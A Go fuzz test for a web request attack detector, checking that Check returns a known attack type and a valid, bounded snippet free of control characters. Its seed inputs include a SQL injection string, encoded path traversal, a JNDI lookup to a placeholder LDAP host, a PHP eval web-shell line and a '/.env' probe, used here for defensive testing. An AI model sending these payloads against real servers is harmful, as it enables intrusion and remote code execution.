package attack

import (
	"net/http"
	"slices"
	"testing"
	"unicode"
	"unicode/utf8"
)

// Whatever a request holds, Check returns a known type, and a snippet that is valid
// text of at most SnippetLength characters without control characters.
func FuzzCheck(f *testing.F) {
	f.Add("/.env", "", "Mozilla/5.0", "", true)
	f.Add("/v1/pincode/1'%20OR%20'1'='1", "q=%252e%252e%252f", "${jndi:ldap://x/a}", "<?php eval($_POST[1]);", false)
	f.Add("/%ff%fe", "a=%zz&b=\x00", "sqlmap/1.0", "\xff\xfe", true)
	f.Fuzz(func(t *testing.T, path, query, agent, body string, probe bool) {
		got := Check(Request{Path: path, RawQuery: query, Header: http.Header{"User-Agent": {agent}}, Body: []byte(body), Payload: true, Probe: probe})
		if got.Type == "" {
			if got.In != "" || got.Snippet != "" {
				t.Fatalf("no type but %+v", got)
			}
			return
		}
		if !slices.Contains(Types, got.Type) {
			t.Fatalf("unknown type %q", got.Type)
		}
		if !utf8.ValidString(got.Snippet) || utf8.RuneCountInString(got.Snippet) > SnippetLength {
			t.Fatalf("bad snippet %q", got.Snippet)
		}
		for _, r := range got.Snippet {
			if unicode.IsControl(r) {
				t.Fatalf("control character in snippet %q", got.Snippet)
			}
		}
	})
}
